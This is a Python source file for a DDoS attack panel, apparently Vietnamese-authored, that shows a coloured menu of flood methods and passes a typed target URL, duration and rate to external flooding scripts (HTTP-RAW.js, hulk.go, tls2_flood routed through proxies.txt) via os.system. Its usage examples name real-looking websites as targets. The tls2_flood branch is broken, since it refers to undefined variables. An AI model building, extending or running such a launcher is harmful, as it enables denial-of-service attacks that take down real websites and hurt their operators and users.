from multiprocessing.connection import wait
import socket
import os
import random
import getpass
import time
import sys

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxys = open('proxies.txt').readlines()
bots = len(proxys)

def si():
    print('\x1b[38;2;233;233;233mWelcome to LMH  DDos \x1b[38;2;233;233;233mBy LMH')
    print("")

def special():
    clear()
    si()
    print(f'''
                                \x1b[38;2;0;212;14m╔═══════════════╗
                                \x1b[38;2;0;212;14m║    \x1b[38;2;0;255;255mSpecial    \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╔═══════════════╩══════╦════════╩═══════════════╗
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mstress              \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║  
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╚══════════════════════╩════════════════════════╝
''')

def menu():
    clear()
    sys.stdout.write(f"\x1b]2;SUS DDoS By NguyenThanh")
    clear()
    print('\x1b[38;2;233;233;233mMethods By NguyenThanh Update V2 \x1b[38;2;233;233;233m')
    clear()
    print('\x1b[38;2;233;233;233mMethods By NguyenThanh Update V2 \x1b[38;2;233;233;233m')
    print(f'''
                                    \x1b[38;2;0;255;255m•⢰⡿⠋⠁⠀⠀⠈⠉⠙⠻⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                   \x1b[38;2;0;255;255m•⢀⣿⠇⠀⢀⣴⣶⡾⠿⠿⠿⢿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                \x1b[38;2;0;255;255m• ⣀⣀⣸⡿⠀⠀⢸⣿⣇⠀⠀⠀⠀⠀⠀ ⠙⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                 \x1b[38;2;0;255;255m•⣾⡟⠛⣿⡇⠀⢸⣿⣿⣷⣤⣤⣤⣤⣶⣶⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                \x1b[38;2;0;255;255m•⢀⣿⠀⢀⣿⡇⠀⠀⠀⠻⢿⣿⣿⣿⣿⣿⠿⣿⡏⠀⠀⠀⠀⢴⣶⣶⣿⣿⣿⣆
                                \x1b[38;2;0;255;255m•⢸⣿⠀⢸⣿⡇⠀⠀⠀⠀⠀⠈⠉\x1b[38;2;255;20;147m⠁⠀⠀⠀⣿⡇⣀⣠⣴⣾⣮⣝⠿⠿⠿⣻⡟
                               \x1b[38;2;255;20;147m•⢸⣿⠀⠘⣿⡇⠀⠀⠀⠀⠀⠀⠀⣠⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠉⠀
                               \x1b[38;2;255;20;147m•⠸⣿⠀⠀⣿⡇⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠉⠀⠀⠀⠀
                                \x1b[38;2;255;20;147m•⠻⣷⣶⣿⣇⠀⠀⠀⢠⣼⣿⣿⣿⣿⣿⣿⣿⣛⣛⣻⠉⠁⠀⠀⠀⠀⠀⠀⠀
                                    \x1b[38;2;255;20;147m•⢸⣿⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀
                                    \x1b[38;2;255;20;147m•⢸⣿⣀⣀⣀⣼⡿⢿⣿⣿⣿⣿⣿⡿⣿⣿
                                \x1b[38;2;0;255;255m╔═══════\x1b[38;2;255;20;147m════════╗
                                \x1b[38;2;0;255;255m║    \x1b[38;2;255;20;147mMet\x1b[38;2;0;255;255mhods    \x1b[38;2;255;20;147m║
                \x1b[38;2;0;255;255m╔═══════════════╩══════\x1b[38;2;0;255;255m╦\x1b[38;2;255;20;147m════════╩═══════════════╗
                \x1b[38;2;0;255;255m║  \x1b[38;2;0;255;255mhulk                \x1b[38;2;0;255;255m║  \x1b[38;2;255;20;147mhttp-sockets          \x1b[38;2;255;20;147m║
                \x1b[38;2;0;255;255m║  \x1b[38;2;0;255;255mhttp-raw            \x1b[38;2;0;255;255m║  \x1b[38;2;255;20;147m<empty>               \x1b[38;2;255;20;147m║  
                \x1b[38;2;0;255;255m║  \x1b[38;2;0;255;255mhttp-rand           \x1b[38;2;0;255;255m║  \x1b[38;2;255;20;147m<empty>               \x1b[38;2;255;20;147m║
                \x1b[38;2;0;255;255m║  \x1b[38;2;0;255;255mtls2_flood          \x1b[38;2;0;255;255m║  \x1b[38;2;255;20;147m<empty>               \x1b[38;2;255;20;147m║
                \x1b[38;2;0;255;255m║  \x1b[38;2;0;255;255mhttp-omu            \x1b[38;2;0;255;255m║  \x1b[38;2;255;20;147m<empty>               \x1b[38;2;255;20;147m║
                \x1b[38;2;0;255;255m╚══════════════════════\x1b[38;2;0;255;255m╩\x1b[38;2;255;20;147m════════════════════════╝
''')

def main():
    menu()
    while(True):
        cnc = input('''\x1b[38;2;0;255;255mNhap Le\x1b[38;2;255;20;147mnh DDoS:''')
        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
            layer7()
                
# LAYER 7 METHODS
        
        elif "http-socket" in cnc:
            try:
                url = cnc.split()[1]
                per = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'node HTTP-SOCKETS.js {url} {per} {time}')
            except IndexError:
                print('Usage: http-socket <url> <per> <time>')
                print('Example: http-socket http://example.com 5000 60')

        elif "http-raw" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-RAW.js {url} {time}')
            except IndexError:
                print('Usage: http-raw <url> <time>')
                print('Example: http-raw http://example.com 60')

        elif "http-rand" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-RAND.js {url} {time}')
            except IndexError:
                print('Usage: http-rand <url> <time>')
                print('Example: http-rand http://vailon.com/ 60')

        elif "hulk" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run hulk.go -site {url} {method} nil')
            except IndexError:
                print('Usage: hulk <url> METHODS<GET/POST>')
                print('Example: hulk http://vailon.com/ GET')

        elif "tls2_flood" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'node tls2_flood {method} {url} proxies.txt {time} {rate} {threads}')
            except IndexError:
                print('Usage: node tls2_flood GET/POST <url> proxies.txt <time> <rate/1000-3000> <threads/1-30>')
                print('Example: node tls2_flood GET https://card3s.vn proxies.txt 120 1000 10')  


        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass
            
def login():
    main()

login()
